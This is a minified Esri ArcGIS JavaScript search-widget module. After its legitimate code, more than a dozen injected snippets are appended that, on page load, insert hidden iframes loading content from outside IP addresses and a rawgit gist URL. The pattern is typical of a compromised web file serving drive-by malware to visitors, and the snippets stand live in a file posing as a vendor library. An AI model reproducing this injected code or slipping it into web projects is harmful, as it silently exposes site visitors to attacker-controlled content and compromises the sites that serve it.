// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/Evented dojo/dom-class dojo/_base/lang dojo/_base/array esri/dijit/Search esri/tasks/locator esri/lang esri/layers/FeatureLayer esri/dijit/PopupTemplate jimu/utils".split(" "),function(p,q,r,c,h,t,m,n,u,v,w){return p([q],{domNode:null,config:null,map:null,searchOptions:null,_urlParams:{},constructor:function(b){c.mixin(this,b)},startup:function(){this._init()},_init:function(){var b,d,a;b={map:this.map,addLayersFromMap:!1,autoNavigate:!1,autoComplete:!0,minCharacters:0,
maxLocations:5,searchDelay:100};c.mixin(b,this.searchOptions);this._urlParams=this._getUrlParams();d=this._getGeocoders();a=this._getSearchLayers();0<a.length&&(d=d.concat(a));this.search=new t(b,this.domNode);this.search.set("sources",d);this.search.on("load",c.hitch(this,this._load));this.search.on("select-result",c.hitch(this,this._selectResult));this.search.on("clear-search",c.hitch(this,this._clear));this.search.on("search-results",c.hitch(this,this._results));this.search.on("suggest-results",
c.hitch(this,this._results));this.search.startup();r.add(this.domNode,"searchControl")},_getUrlParams:function(){var b=w.urlToObject(document.location.href);b.query=b.query||{};return b.query},_setSearchString:function(){this._urlParams.find&&(this.search.set("value",this._urlParams.find),setTimeout(c.hitch(this,function(){this.search.search()}),1E3))},_getGeocoders:function(){var b,d;d=[];if(this.config.helperServices&&null!==this.config.helperServices.geocode){b=c.clone(this.config.helperServices.geocode);
if(0===b.length)return d;h.forEach(b,c.hitch(this,function(a){a.url&&(-1<a.url.indexOf(".arcgis.com/arcgis/rest/services/World/GeocodeServer")?(a.hasEsri=!0,a.locator=new m(a.url),a.placefinding=!0,a.singleLineFieldName="SingleLine",a.name=a.name||"Esri World Geocoder",a.placeholder=a.placeholder||a.name,this.config.searchExtent&&(a.searchExtent=this.map.extent,a.localSearchOptions={minScale:3E5,distance:5E4}),a.suggest=!0,d.push(a)):n.isDefined(a.singleLineFieldName)&&(a.locator=new m(a.url),a.suggest=
!0,d.push(a)))}))}return d},_getSearchLayers:function(){var b,d;b=[];this.config.response.itemInfo.itemData&&this.config.response.itemInfo.itemData.applicationProperties&&this.config.response.itemInfo.itemData.applicationProperties.viewing&&this.config.response.itemInfo.itemData.applicationProperties.viewing.search&&this.config.response.itemInfo.itemData.applicationProperties.viewing.search.enabled&&(d=this.config.response.itemInfo.itemData.applicationProperties.viewing.search,h.forEach(d.layers,
c.hitch(this,function(a){var f,e,c,l,k,g;f=this.config.response.itemInfo.itemData.operationalLayers;e=null;h.some(f,function(b){if(b.id===a.id)return e=b,!0});e&&e.hasOwnProperty("url")&&e.layerObject&&(f={},c=e.url,l=e.title||e.name,n.isDefined(a.subLayer)?(c=c+"/"+a.subLayer,h.some(e.layerObject.layerInfos,function(b){if(b.id===a.subLayer)return l+=" - "+e.layerObject.layerInfos[a.subLayer].name,!0}),k=(g=this._getSubLayerInfo(e,a.subLayer))&&g.popupInfo,g=g&&g.definitionExpression):(k=e.popupInfo,
g=e.layerDefinition&&e.layerDefinition.definitionExpression),k&&(f.infoTemplate=new v(k)),f.featureLayer=new u(c),g&&f.featureLayer.setDefinitionExpression(g),f.name=l,f.exactMatch=a.field.exactMatch,f.displayField=a.field.name,f.searchFields=[a.field.name],f.placeholder=d.hintText,f.outFields=["*"],b.push(f))})));return b},_getSubLayerInfo:function(b,d){var a={};h.some(b.layers,c.hitch(this,function(b){b.id===parseInt(d,10)&&(a.popupInfo=b.popupInfo,b.layerDefinition&&b.layerDefinition.definitionExpression&&
(a.definitionExpression=b.layerDefinition.definitionExpression))}));return a},_load:function(b){this.emit("search-loaded",b);this._setSearchString()},_results:function(b){this.emit("search-results",b)},_clear:function(b){this.emit("clear-search",b)},_selectResult:function(b){this.search.blur();this.emit("select-result",b)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});